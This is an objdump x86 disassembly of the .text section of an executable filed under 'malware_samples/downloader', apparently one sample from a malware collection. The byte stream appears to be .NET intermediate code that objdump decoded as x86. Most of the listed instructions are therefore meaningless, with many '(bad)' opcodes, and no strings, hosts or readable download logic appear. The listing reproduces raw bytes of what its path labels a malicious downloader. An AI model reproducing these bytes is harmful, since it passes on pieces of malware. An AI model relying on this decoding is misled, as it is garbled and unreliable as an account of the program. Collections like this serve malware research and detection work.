
malware_samples/downloader/0a333d1da24c6c4a881c5699f8a7c12de26ac8f1f0727f8edf6d76c98fb22791.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	40                   	inc    %eax
  402001:	99                   	cltd
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 bc 4c 00    	add    %al,0x4cbc00
  402013:	00 4c 4c 00          	add    %cl,0x0(%esp,%ecx,2)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 77 00             	add    %dh,0x0(%edi)
  40201e:	00 06                	add    %al,(%esi)
  402020:	10 4a 00             	adc    %cl,0x0(%edx)
  402023:	00 ab 02 00 00 00    	add    %ch,0x2(%ebx)
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 0a                	xor    %cl,(%edx)
  402053:	00 ce                	add    %cl,%dh
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 72 01             	adc    %esi,0x1(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	80 00 00             	addb   $0x0,(%eax)
  402065:	00 73 0e             	add    %dh,0xe(%ebx)
  402068:	00 00                	add    %al,(%eax)
  40206a:	0a 0a                	or     (%edx),%cl
  40206c:	05 20 80 00 00       	add    $0x8020,%eax
  402071:	00 73 0e             	add    %dh,0xe(%ebx)
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 0b                	or     (%ebx),%cl
  402078:	12 02                	adc    (%edx),%al
  40207a:	fe                   	(bad)
  40207b:	15 03 00 00 02       	adc    $0x2000003,%eax
  402080:	03 28                	add    (%eax),%ebp
  402082:	0f 00 00             	sldt   (%eax)
  402085:	0a 2d 08 12 02 03    	or     0x3021208,%ch
  40208b:	7d 03                	jge    0x402090
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 02                	add    $0x2,%al
  402091:	28 0f                	sub    %cl,(%edi)
  402093:	00 00                	add    %al,(%eax)
  402095:	0a 2d 08 12 02 02    	or     0x2021208,%ch
  40209b:	7d 04                	jge    0x4020a1
  40209d:	00 00                	add    %al,(%eax)
  40209f:	04 12                	add    $0x12,%al
  4020a1:	02 08                	add    (%eax),%cl
  4020a3:	28 01                	sub    %al,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	2b 7d 01             	sub    0x1(%ebp),%edi
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 16                	add    $0x16,%al
  4020ae:	0d 18 13 04 0e       	or     $0xe041318,%eax
  4020b3:	04 17                	add    $0x17,%al
  4020b5:	5f                   	pop    %edi
  4020b6:	17                   	pop    %ss
  4020b7:	33 1b                	xor    (%ebx),%ebx
  4020b9:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 00                	add    $0x0,%al
  4020c0:	60                   	pusha
  4020c1:	13 04 0e             	adc    (%esi,%ecx,1),%eax
  4020c4:	05 18 5f 18 33       	add    $0x33185f18,%eax
  4020c9:	0a 11                	or     (%ecx),%dl
  4020cb:	04 20                	add    $0x20,%al
  4020cd:	80 00 00             	addb   $0x0,(%eax)
  4020d0:	00 60 13             	add    %ah,0x13(%eax)
  4020d3:	04 12                	add    $0x12,%al
  4020d5:	02 04 7e             	add    (%esi,%edi,2),%al
  4020d8:	11 00                	adc    %eax,(%eax)
  4020da:	00 0a                	add    %cl,(%edx)
  4020dc:	16                   	push   %ss
  4020dd:	07                   	pop    %es
  4020de:	20 80 00 00 00 06    	and    %al,0x6000000(%eax)
  4020e4:	20 80 00 00 00 12    	and    %al,0x12000000(%eax)
  4020ea:	03 11                	add    (%ecx),%edx
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	01 00                	add    %eax,(%eax)
  4020f0:	00 06                	add    %al,(%esi)
  4020f2:	13 05 11 05 2d 30    	adc    0x302d0511,%eax
  4020f8:	73 04                	jae    0x4020fe
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	06                   	push   %es
  4020fd:	13 06                	adc    (%esi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	12 00                	adc    (%eax),%al
  402105:	00 0a                	add    %cl,(%edx)
  402107:	7d 21                	jge    0x40212a
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 11                	add    $0x11,%al
  40210d:	06                   	push   %es
  40210e:	06                   	push   %es
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	12 00                	adc    (%eax),%al
  402112:	00 0a                	add    %cl,(%edx)
  402114:	7d 22                	jge    0x402138
  402116:	00 00                	add    %al,(%eax)
  402118:	04 11                	add    $0x11,%al
  40211a:	06                   	push   %es
  40211b:	72 01                	jb     0x40211e
  40211d:	00 00                	add    %al,(%eax)
  40211f:	70 7d                	jo     0x40219e
  402121:	23 00                	and    (%eax),%eax
  402123:	00 04 11             	add    %al,(%ecx,%edx,1)
  402126:	06                   	push   %es
  402127:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40212a:	1e                   	push   %ds
  40212b:	02 28                	add    (%eax),%ch
  40212d:	13 00                	adc    (%eax),%eax
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	2a a2 02 7e 16 00    	sub    0x167e02(%edx),%ah
  402137:	00 0a                	add    %cl,(%edx)
  402139:	7d 21                	jge    0x40215c
  40213b:	00 00                	add    %al,(%eax)
  40213d:	04 02                	add    $0x2,%al
  40213f:	7e 16                	jle    0x402157
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 7d 22             	or     0x22(%ebp),%bh
  402146:	00 00                	add    %al,(%eax)
  402148:	04 02                	add    $0x2,%al
  40214a:	7e 16                	jle    0x402162
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 23             	or     0x23(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 02                	add    $0x2,%al
  402155:	28 13                	sub    %dl,(%ebx)
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 2a                	or     (%edx),%ch
  40215b:	1e                   	push   %ds
  40215c:	02 7b 24             	add    0x24(%ebx),%bh
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2a                	add    $0x2a,%al
  402163:	22 02                	and    (%edx),%al
  402165:	03 7d 24             	add    0x24(%ebp),%edi
  402168:	00 00                	add    %al,(%eax)
  40216a:	04 2a                	add    $0x2a,%al
  40216c:	2a 1f                	sub    (%edi),%bl
  40216e:	78 1f                	js     0x40218f
  402170:	32 73 17             	xor    0x17(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 2a                	or     (%edx),%ch
  402177:	06                   	push   %es
  402178:	2a 22                	sub    (%edx),%ah
  40217a:	16                   	push   %ss
  40217b:	16                   	push   %ss
  40217c:	73 18                	jae    0x402196
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 2a                	or     (%edx),%ch
  402182:	06                   	push   %es
  402183:	2a 0e                	sub    (%esi),%cl
  402185:	1f                   	pop    %ds
  402186:	19 2a                	sbb    %ebp,(%edx)
  402188:	06                   	push   %es
  402189:	2a 00                	sub    (%eax),%al
  40218b:	00 03                	add    %al,(%ebx)
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 53 00             	add    %dl,0x0(%ebx)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 7b 26             	add    0x26(%ebx),%bh
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 2c                	add    $0x2c,%al
  40219f:	13 02                	adc    (%edx),%eax
  4021a1:	7b 26                	jnp    0x4021c9
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 6f                	add    $0x6f,%al
  4021a7:	19 00                	sbb    %eax,(%eax)
  4021a9:	00 0a                	add    %cl,(%edx)
  4021ab:	02 14 7d 26 00 00 04 	add    0x4000026(,%edi,2),%dl
  4021b2:	2a 02                	sub    (%edx),%al
  4021b4:	73 1a                	jae    0x4021d0
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0a 7d 26             	or     0x26(%ebp),%bh
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	04 02                	add    $0x2,%al
  4021bf:	7b 26                	jnp    0x4021e7
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	04 23                	add    $0x23,%al
	...
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	1b 00                	sbb    (%eax),%eax
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	02 7b 26             	add    0x26(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 16                	add    $0x16,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	1c 00                	sbb    $0x0,%al
  4021dc:	00 0a                	add    %cl,(%edx)
  4021de:	02 7b 26             	add    0x26(%ebx),%bh
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 17                	add    $0x17,%al
  4021e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e6:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  4021eb:	1e                   	push   %ds
  4021ec:	02 7b 25             	add    0x25(%ebx),%bh
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 2a                	add    $0x2a,%al
  4021f3:	22 02                	and    (%edx),%al
  4021f5:	03 7d 25             	add    0x25(%ebp),%edi
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 2a                	add    $0x2a,%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	05 00 7f 00 00       	add    $0x7f00,%eax
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 0f                	adc    %ecx,(%edi)
  402209:	01 28                	add    %ebp,(%eax)
  40220b:	1e                   	push   %ds
  40220c:	00 00                	add    %al,(%eax)
  40220e:	0a 0f                	or     (%edi),%cl
  402210:	01 28                	add    %ebp,(%eax)
  402212:	1f                   	pop    %ds
  402213:	00 00                	add    %al,(%eax)
  402215:	0a 59 17             	or     0x17(%ecx),%bl
  402218:	58                   	pop    %eax
  402219:	0f 01                	(bad)
  40221b:	28 20                	sub    %ah,(%eax)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	0a 0f                	or     (%edi),%cl
  402221:	01 28                	add    %ebp,(%eax)
  402223:	21 00                	and    %eax,(%eax)
  402225:	00 0a                	add    %cl,(%edx)
  402227:	59                   	pop    %ecx
  402228:	17                   	pop    %ss
  402229:	58                   	pop    %eax
  40222a:	73 22                	jae    0x40224e
  40222c:	00 00                	add    %al,(%eax)
  40222e:	0a 0a                	or     (%edx),%cl
  402230:	16                   	push   %ss
  402231:	0b 2b                	or     (%ebx),%ebp
  402233:	3f                   	aas
  402234:	16                   	push   %ss
  402235:	0c 2b                	or     $0x2b,%al
  402237:	25 06 07 08 28       	and    $0x28080706,%eax
  40223c:	23 00                	and    (%eax),%eax
  40223e:	00 0a                	add    %cl,(%edx)
  402240:	1f                   	pop    %ds
  402241:	20 02                	and    %al,(%edx)
  402243:	7b 25                	jnp    0x40226a
  402245:	00 00                	add    %al,(%eax)
  402247:	04 02                	add    $0x2,%al
  402249:	7b 24                	jnp    0x40226f
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 16                	add    $0x16,%al
  40224f:	73 24                	jae    0x402275
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 81 0e 00 00 01    	or     0x100000e(%ecx),%al
  402259:	08 17                	or     %dl,(%edi)
  40225b:	58                   	pop    %eax
  40225c:	0c 08                	or     $0x8,%al
  40225e:	0f 01                	(bad)
  402260:	28 20                	sub    %ah,(%eax)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 0f                	or     (%edi),%cl
  402266:	01 28                	add    %ebp,(%eax)
  402268:	21 00                	and    %eax,(%eax)
  40226a:	00 0a                	add    %cl,(%edx)
  40226c:	59                   	pop    %ecx
  40226d:	31 c9                	xor    %ecx,%ecx
  40226f:	07                   	pop    %es
  402270:	17                   	pop    %ss
  402271:	58                   	pop    %eax
  402272:	0b 07                	or     (%edi),%eax
  402274:	0f 01                	(bad)
  402276:	28 1e                	sub    %bl,(%esi)
  402278:	00 00                	add    %al,(%eax)
  40227a:	0a 0f                	or     (%edi),%cl
  40227c:	01 28                	add    %ebp,(%eax)
  40227e:	1f                   	pop    %ds
  40227f:	00 00                	add    %al,(%eax)
  402281:	0a 59 31             	or     0x31(%ecx),%bl
  402284:	af                   	scas   %es:(%edi),%eax
  402285:	06                   	push   %es
  402286:	2a 0a                	sub    (%edx),%cl
  402288:	17                   	pop    %ss
  402289:	2a 36                	sub    (%esi),%dh
  40228b:	20 f0                	and    %dh,%al
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 1f                	add    %bl,(%edi)
  402291:	54                   	push   %esp
  402292:	73 17                	jae    0x4022ab
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 2a                	or     (%edx),%ch
  402298:	2a 1f                	sub    (%edi),%bl
  40229a:	78 1f                	js     0x4022bb
  40229c:	54                   	push   %esp
  40229d:	73 17                	jae    0x4022b6
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	0a 2a                	or     (%edx),%ch
  4022a3:	9e                   	sahf
  4022a4:	03 1a                	add    (%edx),%ebx
  4022a6:	5f                   	pop    %edi
  4022a7:	2c 11                	sub    $0x11,%al
  4022a9:	72 01                	jb     0x4022ac
  4022ab:	00 00                	add    %al,(%eax)
  4022ad:	70 72                	jo     0x402321
  4022af:	01 00                	add    %eax,(%eax)
  4022b1:	00 70 17             	add    %dh,0x17(%eax)
  4022b4:	28 27                	sub    %ah,(%edi)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	06                   	push   %es
  4022b9:	2a 72 01             	sub    0x1(%edx),%dh
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	70 72                	jo     0x402332
  4022c0:	01 00                	add    %eax,(%eax)
  4022c2:	00 70 16             	add    %dh,0x16(%eax)
  4022c5:	28 27                	sub    %ah,(%edi)
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	06                   	push   %es
  4022ca:	2a 06                	sub    (%esi),%al
  4022cc:	2a 06                	sub    (%esi),%al
  4022ce:	2a 06                	sub    (%esi),%al
  4022d0:	2a 00                	sub    (%eax),%al
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	1a 00                	sbb    (%eax),%al
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	03 00                	add    (%eax),%eax
  4022de:	00 11                	add    %dl,(%ecx)
  4022e0:	12 00                	adc    (%eax),%al
  4022e2:	fe                   	(bad)
  4022e3:	15 0d 00 00 01       	adc    $0x100000d,%eax
  4022e8:	12 00                	adc    (%eax),%al
  4022ea:	16                   	push   %ss
  4022eb:	28 25 00 00 0a 12    	sub    %ah,0x120a0000
  4022f1:	00 16                	add    %dl,(%esi)
  4022f3:	28 26                	sub    %ah,(%esi)
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	0a 06                	or     (%esi),%al
  4022f9:	2a 06                	sub    (%esi),%al
  4022fb:	2a 13                	sub    (%ebx),%dl
  4022fd:	30 02                	xor    %al,(%edx)
  4022ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	04 00                	add    $0x0,%al
  402306:	00 11                	add    %dl,(%ecx)
  402308:	12 00                	adc    (%eax),%al
  40230a:	fe                   	(bad)
  40230b:	15 0c 00 00 01       	adc    $0x100000c,%eax
  402310:	12 00                	adc    (%eax),%al
  402312:	1f                   	pop    %ds
  402313:	32 28                	xor    (%eax),%ch
  402315:	27                   	daa
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 12                	or     (%edx),%dl
  40231a:	00 1f                	add    %bl,(%edi)
  40231c:	78 28                	js     0x402346
  40231e:	28 00                	sub    %al,(%eax)
  402320:	00 0a                	add    %cl,(%edx)
  402322:	06                   	push   %es
  402323:	2a 06                	sub    (%esi),%al
  402325:	2a 2e                	sub    (%esi),%ch
  402327:	28 29                	sub    %ch,(%ecx)
  402329:	00 00                	add    %al,(%eax)
  40232b:	0a 6f 2a             	or     0x2a(%edi),%ch
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 2a                	or     (%edx),%ch
  402332:	06                   	push   %es
  402333:	2a 3e                	sub    (%esi),%bh
  402335:	02 1f                	add    (%edi),%bl
  402337:	0f 7d                	(bad)
  402339:	24 00                	and    $0x0,%al
  40233b:	00 04 02             	add    %al,(%edx,%eax,1)
  40233e:	28 2b                	sub    %ch,(%ebx)
  402340:	00 00                	add    %al,(%eax)
  402342:	0a 2a                	or     (%edx),%ch
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	05 00 51 02 00       	add    $0x25100,%eax
  40234b:	00 05 00 00 11 73    	add    %al,0x73110000
  402351:	1a 00                	sbb    (%eax),%al
  402353:	00 0a                	add    %cl,(%edx)
  402355:	0a 06                	or     (%esi),%al
  402357:	22 00                	and    (%eax),%al
  402359:	00 c0                	add    %al,%al
  40235b:	40                   	inc    %eax
  40235c:	22 00                	and    (%eax),%al
  40235e:	00 50 41             	add    %dl,0x41(%eax)
  402361:	73 2c                	jae    0x40238f
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 6f 2d             	or     0x2d(%edi),%ch
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 06                	or     (%esi),%al
  40236c:	17                   	pop    %ss
  40236d:	6f                   	outsl  %ds:(%esi),(%dx)
  40236e:	2e 00 00             	add    %al,%cs:(%eax)
  402371:	0a 73 2f             	or     0x2f(%ebx),%dh
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 0b                	or     (%ebx),%cl
  402378:	73 30                	jae    0x4023aa
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  40237f:	31 00                	xor    %eax,(%eax)
  402381:	00 0a                	add    %cl,(%edx)
  402383:	0d 73 31 00 00       	or     $0x3173,%eax
  402388:	0a 13                	or     (%ebx),%dl
  40238a:	04 03                	add    $0x3,%al
  40238c:	28 0f                	sub    %cl,(%edi)
  40238e:	00 00                	add    %al,(%eax)
  402390:	0a 2c 1d 05 2c 0d 07 	or     0x70d2c05(,%ebx,1),%ch
  402397:	72 03                	jb     0x40239c
  402399:	00 00                	add    %al,(%eax)
  40239b:	70 6f                	jo     0x40240c
  40239d:	32 00                	xor    (%eax),%al
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	2b 14 07             	sub    (%edi,%eax,1),%edx
  4023a4:	72 25                	jb     0x4023cb
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	70 6f                	jo     0x402419
  4023aa:	32 00                	xor    (%eax),%al
  4023ac:	00 0a                	add    %cl,(%edx)
  4023ae:	2b 07                	sub    (%edi),%eax
  4023b0:	07                   	pop    %es
  4023b1:	03 6f 32             	add    0x32(%edi),%ebp
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	0a 07                	or     (%edi),%al
  4023b8:	1f                   	pop    %ds
  4023b9:	09 1f                	or     %ebx,(%edi)
  4023bb:	13 73 33             	adc    0x33(%ebx),%esi
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 6f 34             	or     0x34(%edi),%ch
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 07                	or     (%edi),%al
  4023c7:	06                   	push   %es
  4023c8:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  4023ce:	36 00 00             	add    %al,%ss:(%eax)
  4023d1:	0a 13                	or     (%ebx),%dl
  4023d3:	08 12                	or     %dl,(%edx)
  4023d5:	08 28                	or     %ch,(%eax)
  4023d7:	37                   	aaa
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	0a 1b                	or     (%ebx),%bl
  4023dc:	5a                   	pop    %edx
  4023dd:	1e                   	push   %ds
  4023de:	5b                   	pop    %ebx
  4023df:	1f                   	pop    %ds
  4023e0:	12 59 16             	adc    0x16(%ecx),%bl
  4023e3:	73 38                	jae    0x40241d
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	0a 6f 39             	or     0x39(%edi),%ch
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 07                	or     (%edi),%al
  4023ee:	17                   	pop    %ss
  4023ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f0:	3a 00                	cmp    (%eax),%al
  4023f2:	00 0a                	add    %cl,(%edx)
  4023f4:	06                   	push   %es
  4023f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f6:	3b 00                	cmp    (%eax),%eax
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	07                   	pop    %es
  4023fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fc:	3c 00                	cmp    $0x0,%al
  4023fe:	00 0a                	add    %cl,(%edx)
  402400:	05 2c 07 08 17       	add    $0x1708072c,%eax
  402405:	6f                   	outsl  %ds:(%esi),(%dx)
  402406:	3d 00 00 0a 08       	cmp    $0x80a0000,%eax
  40240b:	04 50                	add    $0x50,%al
  40240d:	6f                   	outsl  %ds:(%esi),(%dx)
  40240e:	32 00                	xor    (%eax),%al
  402410:	00 0a                	add    %cl,(%edx)
  402412:	08 1f                	or     %bl,(%edi)
  402414:	0c 07                	or     $0x7,%al
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	3e 00 00             	add    %al,%ds:(%eax)
  40241a:	0a 07                	or     (%edi),%al
  40241c:	6f                   	outsl  %ds:(%esi),(%dx)
  40241d:	3f                   	aas
  40241e:	00 00                	add    %al,(%eax)
  402420:	0a 1f                	or     (%edi),%bl
  402422:	0c 59                	or     $0x59,%al
  402424:	1f                   	pop    %ds
  402425:	14 6f                	adc    $0x6f,%al
  402427:	40                   	inc    %eax
  402428:	00 00                	add    %al,(%eax)
  40242a:	0a 16                	or     (%esi),%dl
  40242c:	28 1f                	sub    %bl,(%edi)
  40242e:	00 00                	add    %al,(%eax)
  402430:	06                   	push   %es
  402431:	28 41 00             	sub    %al,0x0(%ecx)
  402434:	00 0a                	add    %cl,(%edx)
  402436:	13 05 11 05 28 0f    	adc    0xf280511,%eax
  40243c:	00 00                	add    %al,(%eax)
  40243e:	0a 2c 0d 09 72 47 00 	or     0x477209(,%ecx,1),%ch
  402445:	00 70 6f             	add    %dh,0x6f(%eax)
  402448:	32 00                	xor    (%eax),%al
  40244a:	00 0a                	add    %cl,(%edx)
  40244c:	2b 08                	sub    (%eax),%ecx
  40244e:	09 11                	or     %edx,(%ecx)
  402450:	05 6f 32 00 00       	add    $0x326f,%eax
  402455:	0a 17                	or     (%edi),%dl
  402457:	28 1f                	sub    %bl,(%edi)
  402459:	00 00                	add    %al,(%eax)
  40245b:	06                   	push   %es
  40245c:	28 41 00             	sub    %al,0x0(%ecx)
  40245f:	00 0a                	add    %cl,(%edx)
  402461:	13 06                	adc    (%esi),%eax
  402463:	11 06                	adc    %eax,(%esi)
  402465:	28 0f                	sub    %cl,(%edi)
  402467:	00 00                	add    %al,(%eax)
  402469:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  40246c:	11 04 72             	adc    %eax,(%edx,%esi,2)
  40246f:	4d                   	dec    %ebp
  402470:	00 00                	add    %al,(%eax)
  402472:	70 6f                	jo     0x4024e3
  402474:	32 00                	xor    (%eax),%al
  402476:	00 0a                	add    %cl,(%edx)
  402478:	2b 09                	sub    (%ecx),%ecx
  40247a:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40247d:	06                   	push   %es
  40247e:	6f                   	outsl  %ds:(%esi),(%dx)
  40247f:	32 00                	xor    (%eax),%al
  402481:	00 0a                	add    %cl,(%edx)
  402483:	09 17                	or     %edx,(%edi)
  402485:	6f                   	outsl  %ds:(%esi),(%dx)
  402486:	42                   	inc    %edx
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 11                	or     (%ecx),%dl
  40248b:	04 18                	add    $0x18,%al
  40248d:	6f                   	outsl  %ds:(%esi),(%dx)
  40248e:	42                   	inc    %edx
  40248f:	00 00                	add    %al,(%eax)
  402491:	0a 09                	or     (%ecx),%cl
  402493:	1f                   	pop    %ds
  402494:	0c 07                	or     $0x7,%al
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	3f                   	aas
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 20                	or     (%eax),%ah
  40249c:	9e                   	sahf
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 59 28             	add    %bl,0x28(%ecx)
  4024a2:	43                   	inc    %ebx
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 07                	or     (%edi),%al
  4024a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a8:	3e 00 00             	add    %al,%ds:(%eax)
  4024ab:	0a 1f                	or     (%edi),%bl
  4024ad:	24 58                	and    $0x58,%al
  4024af:	1f                   	pop    %ds
  4024b0:	4b                   	dec    %ebx
  4024b1:	1f                   	pop    %ds
  4024b2:	17                   	pop    %ss
  4024b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b4:	40                   	inc    %eax
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	0a 11                	or     (%ecx),%dl
  4024b9:	04 1f                	add    $0x1f,%al
  4024bb:	5d                   	pop    %ebp
  4024bc:	07                   	pop    %es
  4024bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024be:	3f                   	aas
  4024bf:	00 00                	add    %al,(%eax)
  4024c1:	0a 1f                	or     (%edi),%bl
  4024c3:	4d                   	dec    %ebp
  4024c4:	59                   	pop    %ecx
  4024c5:	28 43 00             	sub    %al,0x0(%ebx)
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	07                   	pop    %es
  4024cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cc:	3e 00 00             	add    %al,%ds:(%eax)
  4024cf:	0a 1f                	or     (%edi),%bl
  4024d1:	24 58                	and    $0x58,%al
  4024d3:	1f                   	pop    %ds
  4024d4:	4b                   	dec    %ebx
  4024d5:	1f                   	pop    %ds
  4024d6:	17                   	pop    %ss
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	40                   	inc    %eax
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	0a 02                	or     (%edx),%al
  4024dd:	28 0f                	sub    %cl,(%edi)
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4024e4:	06                   	push   %es
  4024e5:	28 29                	sub    %ch,(%ecx)
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 6f 2a             	or     0x2a(%edi),%ch
  4024ec:	00 00                	add    %al,(%eax)
  4024ee:	0a 6f 32             	or     0x32(%edi),%ch
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	0a 2b                	or     (%ebx),%ch
  4024f5:	07                   	pop    %es
  4024f6:	06                   	push   %es
  4024f7:	02 6f 32             	add    0x32(%edi),%ch
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	0a 06                	or     (%esi),%al
  4024fe:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402504:	6f                   	outsl  %ds:(%esi),(%dx)
  402505:	3f                   	aas
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 1f                	or     (%edi),%bl
  40250a:	0a 58 28             	or     0x28(%eax),%bl
  40250d:	43                   	inc    %ebx
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 07                	or     (%edi),%al
  402512:	6f                   	outsl  %ds:(%esi),(%dx)
  402513:	3e 00 00             	add    %al,%ds:(%eax)
  402516:	0a 1f                	or     (%edi),%bl
  402518:	47                   	inc    %edi
  402519:	58                   	pop    %eax
  40251a:	73 38                	jae    0x402554
  40251c:	00 00                	add    %al,(%eax)
  40251e:	0a 6f 44             	or     0x44(%edi),%ch
  402521:	00 00                	add    %al,(%eax)
  402523:	0a 06                	or     (%esi),%al
  402525:	6f                   	outsl  %ds:(%esi),(%dx)
  402526:	3b 00                	cmp    (%eax),%eax
  402528:	00 0a                	add    %cl,(%edx)
  40252a:	19 8d 3b 00 00 01    	sbb    %ecx,0x100003b(%ebp)
  402530:	13 09                	adc    (%ecx),%ecx
  402532:	11 09                	adc    %ecx,(%ecx)
  402534:	16                   	push   %ss
  402535:	08 a2 11 09 17 09    	or     %ah,0x9170911(%edx)
  40253b:	a2 11 09 18 11       	mov    %al,0x11180911
  402540:	04 a2                	add    $0xa2,%al
  402542:	11 09                	adc    %ecx,(%ecx)
  402544:	6f                   	outsl  %ds:(%esi),(%dx)
  402545:	45                   	inc    %ebp
  402546:	00 00                	add    %al,(%eax)
  402548:	0a 06                	or     (%esi),%al
  40254a:	19 6f 46             	sbb    %ebp,0x46(%edi)
  40254d:	00 00                	add    %al,(%eax)
  40254f:	0a 06                	or     (%esi),%al
  402551:	17                   	pop    %ss
  402552:	6f                   	outsl  %ds:(%esi),(%dx)
  402553:	47                   	inc    %edi
  402554:	00 00                	add    %al,(%eax)
  402556:	0a 06                	or     (%esi),%al
  402558:	28 48 00             	sub    %cl,0x0(%eax)
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	6f                   	outsl  %ds:(%esi),(%dx)
  40255e:	49                   	dec    %ecx
  40255f:	00 00                	add    %al,(%eax)
  402561:	0a 28                	or     (%eax),%ch
  402563:	4a                   	dec    %edx
  402564:	00 00                	add    %al,(%eax)
